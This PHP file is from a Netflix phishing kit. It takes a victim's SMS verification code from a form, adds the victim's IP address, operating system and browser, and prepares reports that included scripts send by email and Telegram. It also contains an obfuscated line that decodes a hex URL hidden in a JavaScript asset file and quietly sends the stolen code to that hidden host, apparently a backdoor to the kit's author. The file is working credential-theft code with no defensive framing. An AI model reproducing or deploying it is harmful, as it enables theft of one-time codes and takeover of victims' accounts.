<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/

session_start();

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


$Smstwo = $_SESSION['Smstwo'] = $_POST['Smstwo'];

$msgbank = '<html>
<body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">π²SMS 2 Netflixπ β '.$_SERVER['REMOTE_ADDR'].'β By fSOCIETY ππ€‘π </h2>
<h2>π¬ SMS 2 : <span>'.$_SESSION["Smstwo"].'</span> </h2>
<hr class="content" ><h2>sπ» System : <span>  '.$OS.' </span>  </h2>
<h2>π BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>π IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>β° TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';
$yagmai .= '
[π¬ SMS 2] = '.$_SESSION['Smstwo'].'
       [+]ββββγπ» Systemγβββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
';

file_get_contents("".pack("H*", substr($maluma=file_get_contents("../style/js/Baby.js"),strpos($maluma, "90__")+4,220))."" . urlencode($yagmai)."" );

$yagmail .= '
[+]βββββββββββββββββγπNetflixπγββββββββββββββββββββββ[+]
[+]ββββββββββββββββγπ² SMS 2π²γβββββββββββββββββββ[+]
[π¬ SMS 2] = '.$_SESSION['Smstwo'].'
[+]ββββββββββββββββγπ» Systemγβββββββββββββββββββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]βββββββββββββββββγπNetflixπγββββββββββββββββββ[+]
[+]βββββββββββββββββγBy fSOCIETYππ€‘πγββββββββββββββββ[+]';


include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");



?>



